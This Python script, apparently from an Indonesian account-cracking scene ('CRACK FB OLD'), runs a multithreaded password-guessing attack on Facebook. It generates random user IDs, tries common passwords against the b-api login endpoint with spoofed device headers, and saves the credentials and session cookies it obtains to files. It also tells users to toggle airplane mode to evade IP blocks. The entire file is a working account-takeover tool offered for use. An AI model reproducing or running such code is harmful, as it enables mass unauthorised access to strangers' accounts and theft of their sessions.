#-----------------------------[IMPORT]-----------------------------------#
import os, sys, time, random, requests
from concurrent.futures import ThreadPoolExecutor

#-----------------------------[COLOR CODE]-----------------------------------#
r = "\x1b[1;31m"
g = "\x1b[1;32m"
y = "\x1b[1;33m"
b = "\x1b[1;34m"
p = "\x1b[1;35m"
c = "\x1b[1;36m"
w = "\x1b[1;37m"
n = "\x1b[0m"

#-----------------------------[GLOBAL VARIABEL]-----------------------------------#
loop = 0
oks, cps = [], []
ugen = []

#-----------------------------[UTILS]-----------------------------------#
def rr(a, b):
    """Random range integer shortcut"""
    return random.randint(a, b)

def rc(data):
    """Random choice shortcut"""
    return random.choice(data)

# ========== PENJAMIN FILE EKSTERNAL ==========
def ensure_files():
    base_dir = "/storage/emulated/0/VARKCOZERY"
    os.makedirs(base_dir, exist_ok=True)
    for file_name in ["ua.txt", "proxy.txt", "OK.txt", "CP.txt", "log.txt"]:
        open(os.path.join(base_dir, file_name), "a").close()
    return base_dir

#----------------------------[LOGO/BANNER]-----------------------------------#
def banner():
    os.system("clear")
    print(f"""{g}
⣿⠛⠛⠛⠛⠻⡆                                        
⠛⢛⣿⠋⢀⡾⠃    ⢀⣤⣤⠤⠤⣤⣤⣀⣀⣀⣠⠶⡶⣤⣀⣠⠾⡷⣦⣀⣤⣤⡤⠤⠦⢤⣤⣄⡀ ⢠⡶⢶⡄  
⢠⡟⠁⣴⣿⢤⡄⣴⢶⠶⡆⠈⢷⡀    ⢀⣭⣫⠵⠥⠽⣄⣝⠵⢍⣘⣄⠳⣤⣀  ⢀⡤⠊⣽⠁ ⠸⣇ ⢿  
⠸⢷⣴⣤⡤⠾⠇⣽⠋⠼⣷ ⠈⢷⡄⢀⣤⡶⠋ ⣀⡄⠤ ⡲⡆  ⠈⠙⡄⠘⢮⢳⡴⠯⣀⢠⡏   ⢻ ⢸⠇ 
       ⠙⠛⠋⠉⢀⣴⠟⠉⢯⡞⡠⢲⠉⣼  ⡰⠁⡇⢀⢷ ⣄⢵ ⠈⡟⢄  ⠙⢷⣤⣤⣤⡿⢢⡿  
          ⣠⠟⠑⠊⠁⡼⣌⢠⢿⢸⢸⡀⢰⠁⡸⡇⡸⣸⢰⢈⠘⡄ ⢸ ⢣⡀ ⠈⢮⢢⣏⣤⡾⠃  
         ⢰⣯⣴⠞⡠⣼⠁⡘⣾⠏⣿⢇⣳⣸⣞⣀⢱⣧⣋⣞⡜⢳⡇ ⢸ ⢆⢧ ⠰⣄⢏⢧⣾⠁   
         ⠈⢹⡏⢰⠁⡻ ⡟⡏⠉ ⣀    ⣀⠁ ⠉⠛⢽⠇ ⣼⡆⠈⡆⠃ ⡏⠻⣾⣽⣇⡀  
          ⢸⠁⡇ ⡇⡄⣿⠷⠿⠿⠛    ⠛⠻⠿⠿⠿⡜⢀⡴⡟⢸⣸⡼  ⡇ ⡞⡆⢻⠙⢦ 
          ⢸⡶⢀⣼⣿⣬⣽⠧⠬⠇      ⢞⣯⣭⢺⣔⣪⣾⣤⠺⡇⢳ ⢠⣧⡾⠛⠛⠻⠶⠞⠁
          ⠘⠷⢿⠟⠉⡀⠈⢦⡀  ⣠⠖⠒⠒⢤⡀ ⢀⡼⠿⢇⡣⢬⣶⠷⢿⣤⡾⠁       
            ⠘⠷⠾⠷⠖⠛⠛⠲⠶⠿⠤⣤⠤⠤⢷⣶⠋   ⣱⠞⠁ ⠈⠉         
                           ⠉⠛⠓⠒⠚⠋              

    [✔] CRACK FB OLD
    [∆] WHATSAPP : 082121348660
    [~] BY VARKCOZERY
""")

#----------------------------[CRACK FUNCTION]-----------------------------------#
def crack_bapi(uid, base_dir):
    global loop
    pwlist = ["123456", "1234567", "12345678", "123456789", "qwerty"]
    #bawah tinggal tambahkan lagi ua nya
    ua = "Mozilla/5.0 (Linux; Android 9.1; RMX3474 Build/SN7L.341085.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.9369.167 Mobile Safari/537.36 [FBAN/Facebook.lite-Android;FBAV/408.9.0.184.422;FBBV/773715057;FBPN/com.facebook.orca;FBDV/RMX3474;FBMD/Realme;FBLC/id_ID;FBCR/Indosat Ooredoo;FBDM/{density=2.25,width=546,height=1730};FBMF/Realme;FBOP/1;FBCA/x86:armeabi-v7a;NetworkType/LTE;FBSV/9.1;FBFW/516;TimeZone/Asia/Jakarta
          Mozilla/5.0 (Linux; Android 8; SM-M146B) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5610.198 Mobile Safari/537.36 [FBAN/FB4A;FBAV/350.5.0.39.187;FBBV/200725631;FBDM/{density=2.1};FBLC/id_ID;FBCR/Smartfren;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-M146B;FBSV/8;FBOP/1]
          Mozilla/5.0 (Linux; Android 9; Vivo Y20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6389.64 Mobile Safari/537.36 [FBAN/FB4Lite;FBAV/311.3.0.138.688;FBBV/451876340;FBDM/{density=1.5};FBLC/en_GB;FBCR/Indosat;FBMF/Vivo;FBBD/Vivo;FBPN/com.facebook.lite;FBDV/Vivo Y20;FBSV/9;FBOP/1]
          Dalvik/2.1.0 (Linux; U; Android 12; RMX2001 Build/QP1A.663961.134) [FBAN/FB4A;FBAV/409.1.0.126.562;FBBV/249101967;FBPN/com.facebook.katana;FBLC/th_TH;FBSV/12;FBDV/RMX2001;FBMD/Realme;FBDM/{density=2.5};FBOP/1]
          Mozilla/5.0 (Linux; Android 14; Infinix X6853 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/492.0.0.127.80;IABMV/1;]
          Mozilla/5.0 (Linux; U; Android 10; TECNO BC3 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 OPR/56.1.2254.57583
          Mozilla/5.0 (Linux; Android 6.0; Infinix_X556_LTE Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]
          Mozilla/5.0 (Linux; U; Android 15; Infinix X6853 Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/140.0.7339.51 Safari/537.36 OPR/95.0.2254.79260
          Mozilla/5.0 (Linux; Android 13; OPD2102A Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.99 Safari/537.36 [FB_IAB/FB4A;FBAV/489.0.0.66.81;IABMV/1;] FBNV/5"

    for pw in pwlist:
        try:
            headers = {
                "x-fb-connection-bandwidth": str(rr(20000000, 40000000)),
                "x-fb-sim-hni": str(rr(20000, 40000)),
                "x-fb-net-hni": str(rr(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": rc(["cell.CTRadioAccessTechnologyHSDPA", "cell.CTRadioAccessTechnologyLTE", "wifi"]),
                "user-agent": ua,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger",
                "accept-encoding": "gzip, deflate"
            }

            url = (
                f"https://b-api.facebook.com/method/auth.login"
                f"?format=json&email={uid}&password={pw}"
                "&credentials_type=device_based_login_password"
                "&generate_session_cookies=1"
                "&error_detail_type=button_with_disabled"
                "&source=device_based_login"
                "&method=GET&locale=en_US"
                "&client_country_code=US"
                "&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            )

            res = requests.get(url, headers=headers, timeout=10).json()

            if "session_key" in res:
                cookie = ";".join(f"{i['name']}={i['value']}" for i in res["session_cookies"])
                oks.append(uid)
                print(f'\n{g}[OK]{w} ID: {uid} PASSWORD: {pw}\nCOOKIE: {cookie}{n}')
                with open(f"{base_dir}/OK.txt", "a") as f:
                    f.write(f"{uid}|{pw}|{cookie}\n")
                break

            elif "www.facebook.com" in res.get("error_msg", ""):
                cps.append(uid)
                print(f'\n{y}[CP]{w} ID:{uid} PASSWORD: {pw}{n}')
                with open(f"{base_dir}/CP.txt", "a") as f:
                    f.write(f"{uid}|{pw}\n")
                break

        except requests.exceptions.ConnectionError:
            time.sleep(5)
        except Exception:
            pass

    loop += 1
    sys.stdout.write(f"\r{c}[CRACK]{n} {g}[{loop}/{total}] OK:{len(oks)} {y}CP:{len(cps)}{n}")
    sys.stdout.flush()

#----------------------------[MAIN]-----------------------------------#
def main():
    global total
    base_dir = ensure_files()
    banner()
    try:
        limit = int(input(f"{c}Masukkan jumlah target: {w}"))
    except:
        limit = 10000

    prefix = ["100000"]
    user_ids = [random.choice(prefix) + str(random.randint(111111111, 999999999)) for _ in range(limit)]
    total = len(user_ids)

    print(f"{g}Total target: {w}{limit}")
    print(f"{y}Mode pesawat on/off biar tidak kena spam IP{n}\n")

    with ThreadPoolExecutor(max_workers=30) as executor:
        for uid in user_ids:
            executor.submit(crack_bapi, uid, base_dir)

    print(f"\n{g}Selesai!{n}")
    print(f"{g}OK: {len(oks)} | CP: {len(cps)}{n}")

#----------------------------[RUN]-----------------------------------#
if __name__ == "__main__":
    main()